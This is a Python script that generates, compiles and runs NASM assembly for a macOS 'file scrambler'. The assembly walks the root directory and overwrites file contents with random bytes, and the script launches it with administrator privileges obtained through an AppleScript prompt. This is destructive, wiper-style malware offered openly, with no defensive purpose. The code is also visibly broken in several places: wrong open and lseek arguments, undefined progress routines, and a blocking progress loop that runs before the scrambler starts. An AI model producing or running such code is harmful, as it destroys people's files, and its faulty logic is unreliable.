import os
import subprocess
import tkinter as tk
from tkinter import ttk

# Assembly code with progress reporting
ASSEMBLY_CODE = """
section .data
    rootDir db "/", 0
    randomByte db 0
    direntSize equ 1024
    msg db "Scrambling file: ", 0
    newline db 10
    fileCount dq 0
    filesScrambled dq 0
    progressFile db "/tmp/progress.txt", 0

section .bss
    dirp resq 1
    fd resq 1
    buffer resb 1
    dirent resb direntSize
    progress resb 4

section .text
    extern _opendir, _readdir, _closedir, _open, _read, _write, _lseek, _close, _lstat, _printf, _exit, _updateProgress, _writeProgress
    global _main, _setTotalFiles

_main:
    mov qword [fileCount], 0
    mov qword [filesScrambled], 0

    mov rdi, rootDir
    call _opendir
    mov [dirp], rax

    cmp rax, 0
    jl error

read_dir:
    mov rdi, [dirp]
    mov rsi, dirent
    call _readdir

    cmp rax, 0
    je close_dir

    add qword [fileCount], 1
    call _updateProgress

    mov rdi, dirent
    call process_entry

    jmp read_dir

close_dir:
    mov rdi, [dirp]
    call _closedir
    xor rdi, rdi
    call _exit

process_entry:
    mov rdi, dirent
    mov rsi, 2
    mov rdx, 0
    call _open
    cmp rax, 0
    jl skip_entry

    mov [fd], rax

scramble_loop:
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 1
    call _read

    cmp rax, 0
    je close_file

    call random
    and al, 0xFF
    mov [buffer], al

    mov rdi, [fd]
    xor rsi, rsi
    mov rdx, -1
    mov rax, 0
    call _lseek

    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 1
    call _write

    jmp scramble_loop

close_file:
    mov rdi, [fd]
    call _close

    add qword [filesScrambled], 1
    call _updateProgress
    call _writeProgress
    ret

skip_entry:
    ret

error:
    xor rdi, rdi
    call _exit

random:
    rdtsc
    xor edx, eax
    mov eax, edx
    ret
"""

ASSEMBLY_FILE = 'file_scrambler.asm'
OBJECT_FILE = 'file_scrambler.o'
EXECUTABLE_FILE = 'file_scrambler'
PROGRESS_FILE = '/tmp/progress.txt'

def install_brew_packages():
    try:
        subprocess.run(['brew', '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("Homebrew not found. Installing Homebrew...")
        subprocess.run(
            ['/bin/bash', '-c',
             "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"],
            check=True
        )

    print("Installing NASM and Clang...")
    subprocess.run(['brew', 'install', 'nasm'], check=True)
    subprocess.run(['brew', 'install', 'clang'], check=True)

def create_assembly_file():
    with open(ASSEMBLY_FILE, 'w') as file:
        file.write(ASSEMBLY_CODE)

def compile_assembly():
    subprocess.run(['nasm', '-f', 'macho64', ASSEMBLY_FILE, '-o', OBJECT_FILE], check=True)
    subprocess.run(['clang', '-framework', 'Cocoa', OBJECT_FILE, '-o', EXECUTABLE_FILE], check=True)

def run_executable():
    # Use AppleScript to prompt for admin permission and run the executable
    script = f"""
    do shell script "/bin/bash -c 'cd {os.path.abspath(os.path.dirname(EXECUTABLE_FILE))} && ./{EXECUTABLE_FILE}'" with administrator privileges
    """
    subprocess.run(['osascript', '-e', script], check=True)

def create_progress_window():
    root = tk.Tk()
    root.title("File Scrambler Progress")

    frame = ttk.Frame(root, padding="10")
    frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

    label = ttk.Label(frame, text="Scrambling files...")
    label.grid(row=0, column=0, padx=5, pady=5)

    progress_bar = ttk.Progressbar(frame, orient="horizontal", length=300, mode="determinate")
    progress_bar.grid(row=1, column=0, padx=5, pady=5)

    root.update_idletasks()

    while True:
        try:
            if os.path.exists(PROGRESS_FILE):
                with open(PROGRESS_FILE, 'r') as f:
                    try:
                        progress = int(f.read().strip())
                        progress_bar['value'] = progress
                        root.update_idletasks()
                        if progress >= 100:
                            break
                    except ValueError:
                        pass
            root.after(100)  # Check progress every 100ms
        except KeyboardInterrupt:
            break

    root.mainloop()

if __name__ == "__main__":
    install_brew_packages()
    create_assembly_file()
    compile_assembly()
    create_progress_window()
    run_executable()
